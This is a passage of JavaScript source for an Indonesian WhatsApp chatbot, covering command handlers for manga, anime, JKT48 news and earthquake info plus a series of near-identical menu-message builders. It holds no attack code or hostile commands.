				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const url = args[0];
				if (!url) return newReply('⚠️ Mohon masukkan URL manga yang ingin dilihat detailnya.');
				try {
					const mangaDetail = await detail(url);
					let captionText = `📚 *Detail Manga* 📚\n\n`;
					captionText += `📖 *Judul*: ${mangaDetail.title}\n`;
					captionText += `🗂️ *Genre*: ${mangaDetail.genres.join(', ')}\n`;
					captionText += `📖 *Deskripsi*: ${mangaDetail.description}\n`;
					captionText += `📅 *Chapter Awal*: ${mangaDetail.awalChapter}\n`;
					captionText += `📅 *Chapter Terbaru*: ${mangaDetail.newChapter}\n`;
					sock.sendMessage(m.chat, {
						image: { url: mangaDetail.coverImage },
						caption: captionText
					}, {
						quoted: m
					})
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mengambil detail manga.');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'jkt48news': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const lang = args[0] || "id";
				try {
					const news = await jktNews(lang);
					if (news.length === 0) {
						return newReply('⚠️ Tidak ada berita terbaru JKT48 yang ditemukan.');
					}
					let captionText = `🎤 *Berita Terbaru JKT48* 🎤\n\n`;
					news.slice(0, 5).forEach((item, index) => {
						captionText += `📰 *${index + 1}. ${item.title}*\n`;
						captionText += `📅 *Tanggal*: ${item.date}\n`;
						captionText += `🔗 *Link*: ${item.link}\n\n`;
					});
					await newReply(captionText);
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mengambil berita JKT48.');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'otakudesu':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let data = await otakuDesu.ongoing();
				let captionText = `「 *JADWAL ANIME* 」\n\n`
				for (let i of data) {
					captionText += `*💬 Judul*: ${i.title}\n`
					captionText += `*📺 Eps*: ${i.episode}\n`
					captionText += `*🔗 URL*: ${i.link}\n\n`
				}
				sock.sendMessage(m.chat, {
					text: captionText,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: 'Ini pemberitahuan Anime terbaru!',
							mediaType: 1,
							previewType: 1,
							body: 'Halo Kak 👋',
							thumbnailUrl: imageUrl,
							renderLargerThumbnail: false,
							mediaUrl: wagc,
							sourceUrl: wagc
						}
					}
				}, {
					quoted: m
				})
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'kusonimeinfo':
			case 'animeinfo': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					const animeList = await Kusonime.info();
					if (animeList.length === 0) {
						return newReply('⚠️ Tidak ada data anime terbaru yang ditemukan saat ini.');
					}
					let captionText = `🎌 *Anime Terbaru dari Kusonime* 🎌\n\n`;
					animeList.slice(0, 5).forEach((anime, index) => {
						captionText += `📺 *${index + 1}. ${anime.title}*\n`;
						captionText += `🔗 *URL*: ${anime.url}\n`;
						captionText += `🗂️ *Genre*: ${anime.genres.join(', ')}\n`;
						captionText += `📅 *Rilis*: ${anime.releaseTime}\n\n`;
					});
					await newReply(captionText);
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mengambil informasi anime terbaru.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'kusonimesearch':
			case 'animesearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Kak, jangan lupa kasih judul anime yang mau dicari! 🥺\n*Kirim perintah*: *${prefix + command} Naruto*`);
				try {
					const searchResults = await Kusonime.search(text);
					if (typeof searchResults === 'string') {
						return newReply(`⚠️ ${searchResults}`);
					}
					let captionText = `🔍 *Hasil Pencarian untuk*: ${text}\n\n`;
					searchResults.slice(0, 5).forEach((anime, index) => {
						captionText += `📺 *${index + 1}. ${anime.title}*\n`;
						captionText += `🔗 *URL*: ${anime.url}\n`;
						captionText += `🗂️ *Genre*: ${anime.genres.join(', ')}\n`;
						captionText += `📅 *Rilis*: ${anime.releaseTime}\n\n`;
					});
					await newReply(captionText);
				} catch (error) {
					console.error(error);
					newReply('⚠️ Terjadi kesalahan saat mencari anime di Kusonime.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'infogempa':
			case 'infobmkg':
			case 'gempa':
			case 'bmkg': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let result = await gempa();
					let gempaData = result.data;
					let captionText = `「 *INFO GEMPA* 」\n\n`;
					captionText += `*🌍 Sumber*: ${result.source}\n`;
					captionText += `*📊 Magnitudo*: ${gempaData.magnitude.trim()}\n`;
					captionText += `*📏 Kedalaman*: ${gempaData.kedalaman.trim()}\n`;
					captionText += `*🗺️ Lintang & Bujur*: ${gempaData.lintang_bujur.trim()}\n`;
					captionText += `*🕒 Waktu*: ${gempaData.waktu.trim()}\n`;
					captionText += `*📍 Wilayah*: ${gempaData.wilayah.trim() || 'Tidak ada data'}\n`;
					captionText += `*😱 Dirasakan*: ${gempaData.dirasakan.trim() || 'Tidak ada data'}\n\n`;
					captionText += `Tetap waspada dan ikuti arahan dari pihak berwenang!`;
					if (gempaData.imagemap) {
						sock.sendMessage(m.chat, {
							image: { url: gempaData.imagemap.startsWith('http') ? gempaData.imagemap : `https://www.bmkg.go.id${gempaData.imagemap}` },
							caption: captionText,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterName: saluranName,
									newsletterJid: saluran,
								},
								externalAdReply: {
									showAdAttribution: true,
									title: 'Informasi Gempa Terkini!',
									mediaType: 1,
									previewType: 1,
									body: 'Stay Safe ya, Kak! 🤗',
									thumbnailUrl: imageUrl,
									renderLargerThumbnail: false,
									mediaUrl: 'https://www.bmkg.go.id',
									sourceUrl: 'https://www.bmkg.go.id'
								}
							}
						}, {
							quoted: m
						});
					} else {
						sock.sendMessage(m.chat, {
							text: captionText,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterName: saluranName,
									newsletterJid: saluran,
								},
								externalAdReply: {
									showAdAttribution: true,
									title: 'Informasi Gempa Terkini!',
									mediaType: 1,
									previewType: 1,
									body: 'Stay Safe ya, Kak! 🤗',
									thumbnailUrl: imageUrl,
									renderLargerThumbnail: false,
									mediaUrl: 'https://www.bmkg.go.id',
									sourceUrl: 'https://www.bmkg.go.id'
								}
							}
						}, {
							quoted: m
						});
					}
				} catch (error) {
					console.error(error);
					sock.sendMessage(m.chat, {
						text: '⚠️ Maaf kak, terjadi kesalahan saat mengambil data gempa.'
					}, {
						quoted: m
					});
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'react': {
				sock.sendMessage(m.chat, { 
					react: { 
						text: args[0], 
						key: m.quoted ? m.quoted.key : m.key 
					}
				})
			}
			break;
			
			case 'tagme': {
				sock.sendMessage(m.chat, { 
					text: `@${m.sender.split('@')[0]}`, 
					mentions: [m.sender] 
				})
			};
			break;

			case 'totalfeature':
			case 'totalfitur': 
			case 'totalcmd': 
			case 'totalcommand': 
				newReply(`✨ *Total Fitur yang Tersedia di ${botName}*: ${feature()} Fitur`);
			break;

			case 'cmd':
			case 'menu': {
				try {
					let userData = db.data.users[m.sender];
					let teks = `Haii *${pushname}* 👋 Ada yang bisa aku bantu hari ini? 😊\n\n`;
					teks += `💰 *Uang*: ${formatAngka(userData.uang || '0')}\n`;
					teks += `💳 *Limit*: ${userData.limit || 'Belum diatur'}\n`;
					teks += `🌟 *Status Premium*: ${userData.premium ? 'Premium' : 'Free'}\n`;
					teks += `🎓 *Gelar*: ${userData.title || 'Belum diatur'}\n\n`;
					teks += "Klik menu di bawah untuk pilihan yang lebih lengkap! 👇";
					const button = [{
						"name": "single_select",
						"buttonParamsJson": `{
							"title": "Pilih Menu 📂",
							"sections": [{
								"title": "Main Menu",
								"rows": [{
									"header": "📚 All Menu",
									"title": "Lihat semua fitur.",
									"id": "${prefix}allmenu"
								},
								{
									"header": "🗝️ Owner Menu",
									"title": "Fitur khusus owner.",
									"id": "${prefix}ownermenu"
								},
								{
									"header": "👥 Group Menu",
									"title": "Fitur untuk grup.",
									"id": "${prefix}groupmenu"
								},
								{
									"header": "🔍 Search Menu",
									"title": "Fitur pencarian.",
									"id": "${prefix}searchmenu"
								},
								{
									"header": "📥 Download Menu",
									"title": "Fitur unduhan.",
									"id": "${prefix}downloadmenu"
								},
								{
									"header": "🛠️ Tools Menu",
									"title": "Alat serbaguna.",
									"id": "${prefix}convertmenu"
								},
								{
									"header": "🎮 Game Menu",
									"title": "Main game seru.",
									"id": "${prefix}gamemenu"
								},
								{
									"header": "🎉 Fun Menu",
									"title": "Fitur hiburan.",
									"id": "${prefix}funmenu"
								}]
							},
							{
								"header": "Extra Menu",
								"rows": [{
									"header": "😋 Anime Menu",
									"title": "Gambar anime.",
									"id": "${prefix}randomanimemenu"
								},
								{
									"header": "💥 Bug Menu",
									"title": "Fitur bug tools.",
									"id": "${prefix}bugmenu"
								},
								{
									"header": "⛵ RPG Menu",
									"title": "Main RPG seru.",
									"id": "${prefix}rpgmenu"
								},
								{
									"header": "✨ Other Menu",
									"title": "Fitur lainnya.",
									"id": "${prefix}othermenu"
								}]
							},
							{
								"header": "Additional Menus",
								"rows": [{
									"header": "🔒 Privacy Menu",
									"title": "Atur privasi.",
									"id": "${prefix}privacymenu"
								},
								{
									"header": "📰 Newsletter Menu",
									"title": "Kelola newsletter.",
									"id": "${prefix}newslettermenu"
								},
								{
									"header": "😈 AI Menu",
									"title": "Fitur AI.",
									"id": "${prefix}aimenu"
								}]
							}]
						}`
					}];

					await sock.sendButtonText(m.chat, button, teks, 'Pilih Menu', m);
				} catch (err) {
					console.error(err);
					newReply(`⚠️ Terjadi kesalahan: ${err.message}`);
				}
				break;
			}

			case 'allmenu': {
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${allMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'ownermenu':
			case 'ownmenu':{
				if (!isCreator) return newReply(mess.owner);
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${ownerMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'groupmenu':
			case 'gcmenu':{
				if (!m.isGroup) return newReply(mess.group);
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${groupMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'searchmenu':
			case 'shmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${searchMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'downloadmenu':
			case 'downmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${downloadMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'convertmenu':
			case 'toolsmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${convertMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'storemenu':
			case 'stmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${storeMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'panelmenu':
			case 'pmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${panelMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'gamemenu':
			case 'gmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${gameMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'funmenu':
			case 'fmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${funMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'randomanimemenu':
			case 'ramenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
